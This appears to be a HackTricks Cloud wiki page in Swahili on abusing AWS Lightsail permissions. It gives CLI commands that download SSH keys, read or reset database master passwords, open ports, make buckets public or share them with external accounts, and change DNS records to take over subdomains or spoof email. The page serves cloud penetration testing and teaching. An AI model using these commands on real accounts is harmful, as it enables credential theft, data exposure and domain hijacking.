# AWS - Lightsail Privesc

{% hint style="success" %}
Jifunze & zoezi Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & zoezi Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya GCP (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## Lightsail

Kwa habari zaidi kuhusu Lightsail angalia:

{% content-ref url="../aws-services/aws-lightsail-enum.md" %}
[aws-lightsail-enum.md](../aws-services/aws-lightsail-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Ni muhimu kutambua kuwa Lightsail **haitumii majukumu ya IAM yanayomilikiwa na mtumiaji** bali yanamilikiwa na akaunti iliyosimamiwa na AWS, hivyo huwezi kutumia huduma hii kwa privesc. Hata hivyo, **data nyeti** kama vile nambari, funguo za API na maelezo ya database yanaweza kupatikana kwenye huduma hii.
{% endhint %}

### `lightsail:DownloadDefaultKeyPair`

Ruhusa hii itakuruhusu kupata funguo za SSH za kufikia mifano:
```
aws lightsail download-default-key-pair
```
**Athari Inayoweza Kutokea:** Pata habari nyeti ndani ya mifano.

### `lightsail:GetInstanceAccessDetails`

Ruhusa hii itakuruhusu kuzalisha funguo za SSH kupata mifano:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Athari Inayoweza Kutokea:** Pata habari nyeti ndani ya mifano.

### `lightsail:CreateBucketAccessKey`

Ruhusa hii itakuruhusu kupata ufunguo wa kufikia ndoo:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Athari Inayoweza Kutokea:** Pata habari nyeti ndani ya ndoo.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Ruhusa hii itakuruhusu kupata anwani za kuingia kwenye database:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Athari Inayoweza Kutokea:** Pata habari nyeti ndani ya database.

### `lightsail:UpdateRelationalDatabase`

Haki hii itakuruhusu kubadilisha nenosiri la kupata ufikivu wa database:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
{% endcode %}

Ikiwa database haipo kwa umma, unaweza pia kuifanya kuwa ya umma na ruhusa hizi za

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
{% endcode %}

**Athari Inayowezekana:** Pata habari nyeti ndani ya database.

### `lightsail:OpenInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Athari Inayoweza Kutokea:** Kufikia bandari nyeti.

### `lightsail:PutInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao. Tafadhali kumbuka kwamba wito huo utafunga bandari yoyote iliyofunguliwa ambayo haijasanidiwa.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Athari Inayowezekana:** Kufikia bandari nyeti.

### `lightsail:SetResourceAccessForBucket`

Ruhusa hii inaruhusu kutoa upatikanaji wa mifano kwa kikapu bila nyenzo za ziada

{% code overflow="wrap" %}
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
{% endcode %}

**Madhara Yanayoweza Kutokea:** Upatikanaji mpya wa vikasha vyenye habari nyeti.

### `lightsail:UpdateBucket`

Kwa kibali hiki, mshambuliaji anaweza kutoa akaunti yake ya AWS upatikanaji wa kusoma kwenye vikasha au hata kufanya vikasha kuwa wazi kwa kila mtu:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Athari Inayowezekana:** Upatikanaji mpya wa vikapu vyenye habari nyeti.

### `lightsail:UpdateContainerService`

Kwa idhini hizi, mshambuliaji anaweza kutoa upatikanaji kwa ECRs za kibinafsi kutoka kwa huduma za vyombo.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Athari Inayowezekana:** Pata habari nyeti kutoka kwa ECR ya kibinafsi

### `lightsail:CreateDomainEntry`

Mshambuliaji mwenye idhini hii anaweza kuunda subdomain na kuuelekeza kwa anwani yake ya IP (uchukuzi wa subdomain), au kutengeneza rekodi ya SPF ambayo inamruhusu kudanganya barua pepe kutoka kwa kikoa, au hata kuweka anwani yake ya IP kama kikoa kuu.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Athari Inayoweza Kutokea:** Kumiliki kikoa

### `lightsail:UpdateDomainEntry`

Mshambuliaji mwenye idhini hii anaweza kuunda subdomain na kuuelekeza kwa anwani yake ya IP (umiliki wa subdomain), au kutengeneza rekodi ya SPF inayomruhusu kudanganya barua pepe kutoka kwa kikoa hicho, au hata kuweka anwani yake ya IP kama kikoa kuu.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Athari Inayowezekana:** Kuchukua kikoa

{% hint style="success" %}
Jifunze na zoea Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoea Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>unga mkono HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
